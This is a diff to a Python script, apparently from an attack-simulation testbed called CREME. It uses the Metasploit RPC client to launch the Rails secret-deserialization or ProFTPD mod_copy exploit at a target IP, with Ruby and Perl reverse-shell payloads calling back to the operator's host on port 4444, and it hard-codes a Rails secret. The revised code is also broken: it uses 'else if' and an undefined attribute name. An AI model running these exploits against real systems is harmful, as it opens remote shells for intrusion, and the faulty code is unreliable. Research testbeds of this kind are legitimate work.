@@ -2,7 +2,7 @@ import time
 import sys
 import os
 from pymetasploit3.msfrpc import MsfRpcClient
-import CREME.CREMEapplication.models
+from CREMEapplication.models import AttackScenario
 
 def record_timestamp(folder, output_time_file):
     output_time_file = os.path.join(folder, output_time_file)
@@ -19,28 +19,25 @@ def main(argv):
     target_ip = argv[3]
 
     client = MsfRpcClient('kali')
-    if(models.AttackScenario.data_theft_FirstStage == "rails_secret_deserialization"):
-        pass #TODO
-'''    
-    exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
-    payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')
+    AS = AttackScenario.objects().all().first()
+    FS = getattr(AS, data_theft_FirstStage)
+    if(FS == "rails_secret_deserialization"):
+        exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
+        payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')
 
-    exploit['RHOSTS'] = target_ip
-    exploit['RPORT'] = 8181
-    exploit['TARGETURI'] = '/'
-    exploit['SECRET'] = 'a7aebc287bba0ee4e64f947415a94e5f'
-    payload['LHOST'] = my_ip
-    payload['LPORT'] = 4444
-'''
-
-    exploit = client.modules.use('exploit', 'unix/ftp/proftpd_modcopy_exec')
-    payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
-
-    exploit['RHOSTS'] = target_ip
-    
-    exploit[''] = '/'
-    payload['LHOST'] = my_ip
-    payload['LPORT'] = 4444
+        exploit['RHOSTS'] = target_ip
+        exploit['RPORT'] = 8181
+        exploit['TARGETURI'] = '/'
+        exploit['SECRET'] = 'a7aebc287bba0ee4e64f947415a94e5f'
+        payload['LHOST'] = my_ip
+        payload['LPORT'] = 4444
+    else if(FS == "proftpd_modcopy_exec"):
+        exploit = client.modules.use('exploit', 'unix/ftp/proftpd_modcopy_exec')
+        payload = client.modules.use('payload', 'cmd/unix/reverse_perl')
+        exploit['RHOSTS'] = target_ip
+        exploit[''] = '/'
+        payload['LHOST'] = my_ip
+        payload['LPORT'] = 4444
 
     output_time_file = 'time_stage_1_start.txt'
     record_timestamp(folder, output_time_file)
